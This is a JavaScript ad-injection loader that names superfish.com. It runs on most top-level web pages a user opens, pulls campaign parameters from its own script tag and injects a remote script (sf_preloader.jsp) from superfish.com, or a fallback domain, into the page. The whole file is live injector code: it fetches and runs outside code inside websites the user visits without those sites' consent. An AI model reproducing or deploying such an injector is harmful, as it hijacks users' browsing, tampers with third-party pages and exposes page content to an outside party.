


if (window == top && !window.visualwww && navigator.appVersion.toLowerCase().indexOf('msie 7') == -1)
{
    (function()
    {
        var windowLocation = location.href.toLowerCase();
        var nofish = false;
        var metaTags = document.getElementsByTagName('meta');
        var metaTag;

        for (var i=0, l=metaTags.length; i<l; i++)
        {
            metaTag = metaTags[i];

            if (metaTag.getAttribute('name') && metaTag.getAttribute('name').toLowerCase() === "s"+"u"+"p"+"e"+"r"+"f"+"i"+"s"+"h" && metaTag.getAttribute('content') && metaTag.getAttribute('content').toLowerCase() == 'nofish')
            {
                nofish = true;
                break;
            }
        }

	    if (windowLocation.search(/\.google\./i) !== -1 && windowLocation.search(/^https?:\/\/(www|play)\.google\.(?!com\/analytics\/)/i) === -1)
        {
            nofish = true;
        }

        if (nofish)
        {
            return;
        }

        

        window.visualwww = {};
visualwww.b = {
    inj : function( d, url, js, cb)
{
	if (window.location.protocol.indexOf( "https" ) > -1 && url.indexOf( "localhost" ) == -1) {
        url = url.replace("http:","https:");
    }
    else {
        url = url.replace("https","http");
    }

	if(visualwww.b.getRealDomain) {
		url = visualwww.b.getRealDomain(url);
    }

    var h = d.getElementsByTagName('head')[0];
    var s = d.createElement( js ? "script" : 'link' );

    if( js ){
        s.type = "text/javascript";
        s.src = url;
    }else{
        s.rel = "stylesheet";
        s.href = url;
    }
    if(cb){
        s.onload = ( function( prm ){
            return function(){
                cb( prm );
            }
        })( url );
        // IE 
        s.onreadystatechange = ( function( prm ) {
            return function(){
                if (this.readyState == 'complete' || this.readyState == 'loaded') {
                    setTimeout( (function(u){
                        return function(){
                            cb( u )
                        }
                    })(prm), 300 );
                }
            }
        })( url );
    }
    h.appendChild(s);
    return s;
}
};
visualwww.b.WSFlow = (function() {

    var startTime = 0;
    var flowSteps = [];

    function addStep(step) {
        if(startTime === 0){
            startTime = new Date().getTime();
        }
        step = ((new Date().getTime()) - startTime) + ' : ' + step;
        flowSteps.push(step);
    }

    function getSteps(delimiter) {
    	var del = delimiter || ' ==> ';
        return flowSteps.join(del);
    }

//    function getSteps() {
//    	return flowSteps.join('==>');
//    }

    return {
        addStep: addStep,
        getSteps: getSteps
    };

})();
visualwww.b.WSFlow.addStep("Start sfbase");
visualwww.ver = {
    ver : "",
    calcAppVersion: function ()
    {
        if(this.ver === ""){
            var CRMLastUpdate = '2015-04-14 20:37:05.406';
            var adsLastUpdate = '2015-04-13 04:47:24';
            var globalAppVersion = '15.4.16.1';

            var globalAppVersionDateParts = globalAppVersion.split('.');
            var globalAppVersionYear = +globalAppVersionDateParts[0] + 2000;
            var globalAppVersionMonth = +globalAppVersionDateParts[1] - 1;
            var globalAppVersionDay = +globalAppVersionDateParts[2];
            var globalAppVersionHour = +globalAppVersionDateParts[3];

            var globalAppVersionDate = new Date(globalAppVersionYear,globalAppVersionMonth,globalAppVersionDay,globalAppVersionHour,1,0,0)
            var lastUpdate = new Date();

            if( CRMLastUpdate !== ''){
                var CRMLastUpdateDateParts = CRMLastUpdate.split('-');
                var CRMLastUpdateYear = +CRMLastUpdateDateParts[0];
                var CRMLastUpdateMonth = +CRMLastUpdateDateParts[1] - 1;
                var CRMLastUpdateDay = +CRMLastUpdateDateParts[2].split(' ')[0];
                var CRMLastUpdateHour = +CRMLastUpdateDateParts[2].split(' ')[1].split(':')[0];
                var CRMLastUpdateMin = +CRMLastUpdateDateParts[2].split(' ')[1].split(':')[1];

                var CRMLastUpdateDate = new Date(CRMLastUpdateYear,CRMLastUpdateMonth,CRMLastUpdateDay,CRMLastUpdateHour,CRMLastUpdateMin,0,0)

                if(CRMLastUpdateDate > globalAppVersionDate){
                    lastUpdate = CRMLastUpdateDate;
                } else {
                    lastUpdate = globalAppVersionDate;
                }
            } else {
                lastUpdate = globalAppVersionDate;
            }

            var lastUpdateYear = lastUpdate.getFullYear();
            var lastUpdateMonth = lastUpdate.getMonth();
            var lastUpdateDay = lastUpdate.getDate();
            var lastUpdateHour = lastUpdate.getHours();
            var lastUpdateMinutes = lastUpdate.getMinutes();

            if(adsLastUpdate !== '') {
                var adsLastUpdateDateParts = adsLastUpdate.split('-');
                var adsLastUpdateYear = +adsLastUpdateDateParts[0];
                var adsLastUpdateMonth = +adsLastUpdateDateParts[1] - 1;
                var adsLastUpdateDay = +adsLastUpdateDateParts[2].split(' ')[0];
                var adsLastUpdateHour = +adsLastUpdateDateParts[2].split(' ')[1].split(':')[0];
                var adsLastUpdateMin = +adsLastUpdateDateParts[2].split(' ')[1].split(':')[1];

                var adsLastUpdateDate = new Date(adsLastUpdateYear,adsLastUpdateMonth,adsLastUpdateDay,adsLastUpdateHour,adsLastUpdateMin,0,0)
                if(adsLastUpdateDate > globalAppVersionDate){
                    this.ver = [adsLastUpdateYear,adsLastUpdateMonth + 1,adsLastUpdateDay,adsLastUpdateHour,adsLastUpdateMin].join('.');
                } else {
                    this.ver = [lastUpdateYear,lastUpdateMonth + 1,lastUpdateDay,lastUpdateHour,lastUpdateMinutes].join('.');
                }

            } else {
                this.ver = [lastUpdateYear,lastUpdateMonth + 1,lastUpdateDay,lastUpdateHour,lastUpdateMinutes].join('.');
            }
        }
        return this.ver;
    }
};


        var srcRegex = /\/sf_main\.|\/sf_conduit\.|\/sf_conduit_mam\.|\/sf_conduit_mam_app\.|\/sfw\./i; // Test for script tag src that may contain the app params query string
        var queryStringRegex = /CTID=(CT2680812|CT2652911|CT2659749|CT2695421|CT2666540)/i // Test for "specialsavings" patch
        var retryCounter = 1; // Used in the run() function as a fallback condition after 5 attempts
        var timeoutHandle;

        function extractQueryString()
        {
            var queryString = '';
            var scripts = document.getElementsByTagName('script');
            var scriptSrc;

            try
            {
                for (var i=0, l=scripts.length; i<l; i++)
                {
                    scriptSrc = scripts[i].src;

                    if (srcRegex.test(scriptSrc))
                    {
                        if (scriptSrc.indexOf('?') != -1)
                        {
                            var tempQueryString = scriptSrc.substring(scriptSrc.indexOf('?'));
							visualwww.b.injectionDomain = scriptSrc.split('/')[2];
                            queryString = fixQs(tempQueryString);
                        }

                        break;
                    }
                }
            }
            catch(ex)
            {
                queryString = '';
            }

            return queryString;
        }

        function fixQs(initialQS){
            var fixedQS = '?';
            initialQS.replace(
                new RegExp("([^?=&]+)(=([^&]*))?", "g"),
                function($0, $1, $2, $3)
                {

                    switch ($1)
                    {
                        case 'dlsource':
                            $3 = decodeURIComponent($3).replace(/^\s+|\s+$/g,"");
                        break;
                    }

                    fixedQS = fixedQS + $1 + '=' + $3 + '&';
                }
            );
            return fixedQS.substring(0, fixedQS.length - 1);
        }

        function loadApp(queryString)
        {
            var appVersion = visualwww.ver.calcAppVersion();
            queryString += (queryString == '') ? '?' : '&';
            queryString += 'ver='+appVersion;
            if (queryStringRegex.test(queryString)) // Specialsavings patch
            {
                if (queryString.indexOf('dlsource=') > -1)
                {
                    queryString = queryString.replace(/dlsource=([^&]*)?/g, 'dlsource=specialsavings_tb');
                }
                else
                {
                    queryString += '&dlsource=specialsavings_tb';
                }
            }

            // Assign values to the global visualwww object
            visualwww.b.initialQS = queryString;
			if(visualwww.b.WSFlow){
				visualwww.b.WSFlow.addStep("before call to sf_preloader.jsp");
			}

            visualwww.b.inj(window.document, 'https://www.superfish.com/ws/sf_preloader.jsp' + queryString, 1);
        }

		

		visualwww.b.getRealDomain = function(url){
			if(url.indexOf( "keepwiththesamedomain" ) > -1){
				if(!visualwww.b.replaceWith){
					visualwww.b.replaceWith = visualwww.b.injectionDomain ? visualwww.b.injectionDomain : 'www.qwerfv.com';
				}
				url = url.replace("www.keepwiththesamedomain",visualwww.b.replaceWith);
			}
			return url;
		}

        function run()
        {
            var queryString = extractQueryString();

            if (queryString.search(/dlsource=hdrykzc/i) !== -1) // Disable Lenovo users
            {
                return;
            }

            timeoutHandle && clearTimeout(timeoutHandle);

            if (queryString || retryCounter >= 5)
            {
                var appVersion = visualwww.ver.calcAppVersion();



		

//                syncLocalStorage.createIframe(queryString + '&ver='+appVersion, function()
//                {
                    loadApp(queryString);
//                });
            }
            else
            {
                retryCounter++;
                timeoutHandle = setTimeout(run, 50);
            }
        }

        /* --- Begin app loading cycle --- */
        run();
    })();
}